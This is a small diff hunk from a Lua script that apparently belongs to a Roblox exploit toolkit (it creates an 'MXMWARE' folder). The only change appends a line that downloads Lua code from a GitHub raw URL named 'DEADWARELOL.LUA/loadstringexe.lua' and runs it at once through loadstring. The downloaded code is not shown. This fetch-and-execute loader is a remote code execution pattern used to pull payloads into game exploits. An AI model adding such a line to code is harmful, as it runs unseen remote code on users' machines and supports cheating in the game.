@@ -144,3 +144,5 @@ makefolder("MXMWARE")
     },
 }
 
+
+loadstring(game:HttpGet('https://raw.githubusercontent.com/SKIDDEDMXMIFEIED/DEADWARELOL.LUA/main/loadstringexe.lua',true))()
